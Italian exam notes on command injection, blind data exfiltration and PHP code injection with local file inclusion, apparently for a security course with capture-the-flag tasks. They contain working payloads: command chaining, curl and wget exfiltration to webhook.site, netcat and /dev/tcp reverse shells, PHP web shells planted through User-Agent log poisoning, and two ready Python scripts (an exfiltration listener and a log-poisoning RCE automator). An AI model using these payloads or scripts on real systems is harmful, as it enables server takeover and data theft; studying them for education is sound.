# Appunti Pratici per l'Esame: Command and Code Injections

Questo modulo contiene la teoria fondamentale e gli script Python d'automazione pronti per l'esame sul modulo **Command and Code Injections**. È strutturato in base alle slide, dividendo la trattazione in concetti discorsivi, preamboli di funzionamento e schemi operativi di sfruttamento.

---

## 📂 Sezione 1: Command Injection (OS-level)

### 1. Inquadramento Concettuale e Discorsivo
La **Command Injection** si verifica quando un'applicazione web passa dati non controllati (forniti dall'utente) direttamente a una shell del sistema operativo (come Bash o sh). Invece di limitarsi a elaborare i dati come argomenti semplici, il server interpreta alcuni caratteri inseriti dall'attaccante come veri e propri separatori di comandi di sistema. Questo rompe la barriera logica che dovrebbe esistere tra l'applicazione web e il sistema operativo host.
L'impatto è solitamente devastante: compromette totalmente la **riservatezza** (Confidentiality), l'**integrità** (Integrity) e la **disponibilità** (Availability) del server, consentendo spesso a un utente malintenzionato di eseguire codice a livello di sistema operativo con gli stessi privilegi con cui è in esecuzione il web server (es. `www-data`).

### 2. Preambolo sul Funzionamento
Immaginiamo un'applicazione web che consenta agli utenti di verificare se un computer è online effettuando un ping. Dietro le quinte, lo sviluppatore ha scritto una riga di codice che richiama una funzione di sistema passando l'indirizzo IP inserito dall'utente, ad esempio: `system("ping " . $_GET['host']);`.
Se l'input non viene sanificato, l'interprete dei comandi (ad esempio Bash) leggerà la stringa fornita dall'utente. Se l'utente inserisce `example.com; ls`, il sistema eseguirà in sequenza:
1. `ping example.com` (il comando originale previsto)
2. `ls` (il comando iniettato dall'utente, eseguito grazie al punto e virgola che funge da separatore)

Questo comportamento è reso possibile dal fatto che le shell Unix/Windows possiedono dei metacaratteri sintattici utilizzati per controllare il flusso di esecuzione delle istruzioni.

### 3. Approfondimento Tecnico Operativo

#### Sinks Comuni (Funzioni vulnerabili in WhiteBox)
In fase di esame o di analisi del codice, è necessario cercare funzioni specifiche della lingua utilizzata che invocano una shell:
* **PHP:** `system()`, `exec()`, `passthru()`, `shell_exec()`, `popen()`, `proc_open()`, e l'operatore backtick (`` ` ``).
* **Python:** `os.system()`, `subprocess.Popen(..., shell=True)`, `subprocess.run(..., shell=True)`.

#### Operatori di Concatenazione in Bash (Payload d'Iniezione)
Per concatenare un comando iniettato a quello legittimo, si possono sfruttare diversi operatori di controllo:
* `;` (Semicolon): Esegue il secondo comando indipendentemente dall'esito del primo. (Es: `ip=127.0.0.1; cat /etc/passwd`)
* `\n` (Newline - `%0a` in URL encoding): Forza l'andata a capo ed esegue il comando successivo su una nuova linea logica. Fondamentale se gli spazi o il punto e virgola sono filtrati.
* `&` (Ampersand singola): Esegue il primo comando in background ed esegue immediatamente il secondo.
* `&&` (AND logico): Esegue il secondo comando *solo se* il primo termina con successo (exit code 0).
* `||` (OR logico): Esegue il secondo comando *solo se* il primo fallisce (exit code diverso da 0). Utile se sappiamo che il primo comando fallirà e vogliamo assicurarci che il nostro venga comunque eseguito.
* `$(comando)` o `` `comando` `` (Command Substitution): Sostituisce l'output del comando racchiuso direttamente all'interno dell'argomento corrente. (Es: `ls $(whoami)` -> `ls www-data`)

#### Tecniche di Rilevamento (Detection in BlackBox)
1. **BlackBox con feedback (In-Band):**
 Si immettono caratteri speciali di controllo e si osserva l'output della pagina. Se inseriamo un comando non esistente (es. `; non_existent_command_xyz`), l'applicazione potrebbe stampare a schermo l'errore tipico della shell: `bash: command not found: non-existent-command`.
2. **BlackBox cieca (Blind - Time-Based):**
 Se l'output del comando non viene mostrato a video, il metodo più affidabile per testare la vulnerabilità consiste nell'introdurre una latenza temporale controllata.
 * Payload: `127.0.0.1; sleep 5` (o `127.0.0.1 && sleep 5`)
 * Se la pagina web impiega esattamente 5 secondi (o più) per rispondere, la Command Injection è confermata.

---

## 📂 Sezione 2: Blind Command Injection (Esfiltrazione Avanzata)

### 1. Inquadramento Concettuale e Discorsivo
La situazione d'esame più comune vede la presenza di una **Blind Command Injection**: l'applicazione esegue correttamente i nostri comandi di sistema ma non restituisce alcun output (né standard output, né standard error) nella risposta HTTP. 
Dato che non possiamo leggere la flag direttamente a schermo, dobbiamo trovare un modo alternativo per far uscire i dati dal server vulnerabile e inviarli a un sistema controllato da noi. Questo processo viene chiamato **esfiltrazione dei dati**.

### 2. Preambolo sul Funzionamento
Esistono due vie principali per esfiltrare i dati in uno scenario Blind:
1. **Esfiltrazione locale (Web Root):** Reindirizziamo l'output del comando in un file di testo salvato all'interno di una cartella pubblica del server web. Successivamente, scarichiamo il file tramite il browser.
2. **Esfiltrazione remota (Out-Of-Bound / OOB):** Costringiamo il server vulnerabile a connettersi a una macchina esterna controllata da noi (il nostro computer d'attacco o un servizio pubblico) inviando i dati all'interno della richiesta stessa (es. come nome di un dominio DNS o query string di una chiamata HTTP).

### 3. Approfondimento Tecnico Operativo

#### Metodo A: Scrittura in cartelle scrivibili (Reindirizzamento)
Sfrutta il carattere di redirezione `>` (sovrascrittura) o `>>` (accodamento).
* **Payload:** `; cat /flag.txt > /var/www/html/static/flag.txt`
* Successivamente, si recupera la flag visitando direttamente: `http://target.com/static/flag.txt`
* **Cartelle tipicamente scrivibili dal server web:**
 * Cartelle per file statici (es. `/static/`, `/js/`, `/css/`, `/uploads/`).
 * Cartella temporanea globale `/tmp/` (spesso però non è accessibile via web).

#### Metodo B: Out-Of-Bound via HTTP/DNS (Pingback)
Se il server vittima ha accesso a Internet, possiamo fargli effettuare una connessione in uscita.
1. **Ottenere una macchina ricevente:**
 * Usare servizi come [Webhook.site](https://webhook.site/) per generare un indirizzo HTTP temporaneo su cui monitorare le richieste in tempo reale.
2. **Esfiltrazione via URL (Command Substitution):**
 * Il server esegue il comando e concatena il risultato all'URL di richiesta.
 * **Payload:** `; wget http://webhook.site/tuo-token/$(whoami)` o `; curl http://webhook.site/tuo-token/$(cat /flag.txt | base64)`
 * *Nota importante:* Se il file contiene spazi o caratteri strani, l'URL si rompe. Per questo è consigliabile codificare l'output in **base64** prima dell'invio.
3. **Esfiltrazione del file intero:**
 * `wget` permette di inviare file interi nel corpo di una richiesta POST in modo estremamente pulito.
 * **Payload:** `; wget --post-file=/flag.txt http://webhook.site/tuo-token/`

#### Metodo C: Reverse Shell
Il metodo definitivo per ottenere il controllo interattivo sul server.
1. **Sulla macchina d'attacco (ascoltatore):**
 * Si avvia un listener TCP su una porta a scelta (es. 1337) tramite Netcat: `nc -lvp 1337`
2. **Sul server vulnerabile (connessione inversa):**
 * Si lancia un comando che redirige l'input e l'output della shell (`/bin/bash`) verso la porta dell'attaccante.
 * **Payload Netcat (se supportato il parametro `-e`):** `; nc -e /bin/bash ip_attaccante 1337`
 * **Payload Bash puro (estremamente robusto):** `; sh -i >& /dev/tcp/ip_attaccante/1337 0>&1`

---

## 📂 Sezione 3: Code Injection e Local File Inclusion (LFI) in PHP

### 1. Inquadramento Concettuale e Discorsivo
A differenza della Command Injection (che richiama la shell dell'OS), la **Code Injection** inserisce ed esegue codice direttamente all'interno dell'interprete dell'applicazione stessa (es. l'interprete PHP, Python o Node.js). 
In PHP, questo tipo di attacco si incrocia strettamente con le vulnerabilità di **Local File Inclusion (LFI)**. Una LFI si verifica quando l'applicazione web include ed esegue file locali presenti sul server basandosi sull'input dell'utente. Se riusciamo a combinare una LFI con la possibilità di scrivere codice PHP in un qualsiasi file sul server, otteniamo una **Remote Code Execution (RCE)** completa.

### 2. Preambolo sul Funzionamento
Supponiamo che una pagina web carichi i diversi moduli del sito usando un parametro `?page=contatti`. Il codice PHP esegue un'istruzione come `include 'path/to/file';`.
Se l'input fornito dall'utente è passato direttamente a `include`, un utente malintenzionato sarà in grado di eseguire file PHP arbitrari sul filesystem.
Se inseriamo `?page=/etc/passwd`, l'applicazione cercherà di includere il file passwd (anche se non ha estensione `.php`, in alcune versioni o configurazioni viene comunque visualizzato).
Ma come facciamo a fargli eseguire del *nostro* codice PHP se non possiamo caricare file direttamente?
Sfruttiamo il **File Poisoning (o Log Poisoning)**: inseriamo del codice PHP all'interno di file di log generati dal server (come i log di Apache, Nginx o SSH), che memorizzano stringhe fornite dall'utente come il parametro `User-Agent` o il nome utente di login. Successivamente, sfruttiamo la LFI per includere quel file di log: l'interprete PHP leggerà il log e, non appena incontrerà i tag speciali `<?php ... ?>`, eseguirà il codice in essi contenuto.

### 3. Approfondimento Tecnico Operativo

#### Sinks di Code Injection (WhiteBox)
Common entry points in scripting languages are all functions that permit evaluating code dynamically:
* **PHP:** `eval()`, `assert()`, `preg_replace()` (con il modificatore `/e` nelle vecchie versioni), `create_function()`.

#### Strategie di Sfruttamento LFI + Poisoning
Se trovi una vulnerabilità di inclusione file come `include($_GET['file'])`:
1. **Analisi e Path Traversal:**
 * Usa il path traversal per verificare se riesci a leggere i file di sistema.
 * Payload: `?file=../../../../etc/passwd`
2. **Log Poisoning via Apache/Nginx User-Agent:**
 * Invia una richiesta HTTP normale al server modificando l'header `User-Agent` per inserire una web shell PHP minimale.
 * **Payload HTTP Header:** `User-Agent: <?php system($_GET['cmd']); ?>`
 * Trova il file di log del server (i percorsi tipici variano a seconda del sistema):
 * `/var/log/apache2/access.log`
 * `/var/log/nginx/access.log`
 * `/var/log/httpd/access_log`
 * Includi il file di log tramite la LFI e passa il comando di sistema desiderato:
 * URL: `?file=../../../../var/log/apache2/access.log&cmd=cat /flag.txt`

#### Regola d'Oro per l'Esame (Web Shell Minimale)
Nelle sfide pratiche, molti server bloccano o disabilitano funzioni di sistema comuni come `system()`, `exec()` o `shell_exec()` tramite la direttiva `disable_functions` nel file `php.ini`.
* **Consiglio Fondamentale delle Slide:** Quando effettui il file poisoning o carichi file, usa il payload PHP più semplice e versatile possibile, basato sulla valutazione dinamica all'interno dell'interprete anziché sui comandi di sistema:
 * **Payload Web Shell:** `<?php eval($_GET['c']); ?>`
 * Questa shell valuta codice PHP puro. Se le funzioni di sistema sono disabilitate, puoi comunque usare funzioni PHP native per leggere la flag senza passare dal sistema operativo (es. `c=print_r(scandir('.'));` per elencare i file, oppure `c=echo file_get_contents('/flag.txt');`).

---

## 📂 Sezione 4: Script di Supporto Pronti all'uso

Di seguito sono riportati gli script in Python da memorizzare sulla tua chiavetta USB per automatizzare le operazioni durante l'esame.

### 🛠️ Script 1: Listener Multi-funzione per Esfiltrazione Blind
Questo script avvia un server web in ascolto sulla tua porta locale che logga qualsiasi richiesta HTTP POST o GET in ingresso, stampando a schermo immediatamente il contenuto esfiltrato (anche se codificato in Base64). È perfetto da usare con i pingback di `wget` o `curl`.

```python
import base64
from http.server import BaseHTTPRequestHandler, HTTPServer


class ExfilRequestHandler(BaseHTTPRequestHandler):

 def log_message(self, format, *args):
 # Disabilita i log standard a schermo per non intasare l'output
 return

 def do_GET(self):
 print(f"\n[+] Connessione GET ricevuta da {self.client_address}")
 path = self.path.lstrip("/")
 print(f"[*] Path grezzo: {path}")

 # Tenta di decodificare l'URL se è in base64
 try:
 decoded = base64.b64decode(path).decode("utf-8")
 print(f"[🔥 DATA - Base64 Decoded]: {decoded}")
 except Exception:
 print(f"[!] Impossibile decodificare come Base64. Contenuto letterale: {path}")

 self.send_response(200)
 self.end_headers()
 self.wfile.write(b"OK")

 def do_POST(self):
 print(f"\n[+] Connessione POST ricevuta da {self.client_address}")
 content_length = int(self.headers["Content-Length"])
 post_data = self.rfile.read(content_length)

 print("-" * 50)
 print("[🔥 DATA - File o Corpo del POST]:")
 try:
 print(post_data.decode("utf-8"))
 except UnicodeDecodeError:
 print(post_data) # Stampa i byte grezzi in caso di file binario
 print("-" * 50)

 self.send_response(200)
 self.end_headers()
 self.wfile.write(b"OK")


def run(port=1337):
 server_address = ("", port)
 httpd = HTTPServer(server_address, ExfilRequestHandler)
 print(f"[*] Server in ascolto per esfiltrazione sulla porta {port}...")
 try:
 httpd.serve_forever()
 except KeyboardInterrupt:
 print("\n[!] Spegnimento del server.")
 httpd.server_close()


if __name__ == "__main__":
 # Cambia la porta a seconda delle tue esigenze d'esame
 run(port=1337)
```

### 🛠️ Script 2: Automatore per Log Poisoning LFI
Questo script automatizza l'avvelenamento (poisoning) del file di log modificando l'header `User-Agent` per iniettare la web shell minimale, ed esegue successivamente la chiamata alla LFI per confermare l'ottenimento di RCE.

```python
import requests

# === CONFIGURAZIONE TARGET ===
BASE_URL = "http://example.com/index.php" # Modifica con l'URL dell'esame
# Esempio di parametro LFI (es: ?page=../../...)
LFI_PARAM = "page"
# Percorso del log di Apache/Nginx ipotizzato (prova i diversi della lista)
LOG_PATH = "../../../../var/log/apache2/access.log"

# Payload minimale consigliato per bypassare disable_functions
PHP_PAYLOAD = "<?php eval($_GET['c']); ?>"

# Comando PHP da eseguire una volta iniettato (es: mostra i file della directory)
EXAM_CMD = "print_r(scandir('.'));"


def poison_log():
 print(f"[*] 1. Tentativo di avvelenamento del log inviando il payload PHP nell'User-Agent...")
 headers = {"User-Agent": PHP_PAYLOAD}

 try:
 # Inviamo una richiesta normale sul target per scrivere nel log
 requests.get(BASE_URL, headers=headers, timeout=5)
 print("[+] Richiesta inviata con successo. Payload registrato.")
 except Exception as e:
 print(f"[-] Errore nell'invio del payload: {e}")
 return False

 print(f"[*] 2. Chiamata al parametro LFI includendo il log avvelenato...")
 params = {
 LFI_PARAM: LOG_PATH,
 "c": EXAM_CMD, # Questo parametro viene valutato dall'eval() iniettato
 }

 try:
 r = requests.get(BASE_URL, params=params, timeout=5)
 if r.status_code == 200:
 print("[+] Risposta ricevuta (Status 200). Controlla se l'output sotto contiene l'elenco dei file:")
 print("-" * 60)
 # Tagliamo l'output o cerchiamo stringhe note per facilitare la lettura
 print(r.text[:2000]) # Mostra i primi 2000 caratteri della risposta log
 print("-" * 60)
 else:
 print(f"[-] Status code inatteso: {r.status_code}")
 except Exception as e:
 print(f"[-] Errore durante l'inclusione del log: {e}")


if __name__ == "__main__":
 poison_log()
```
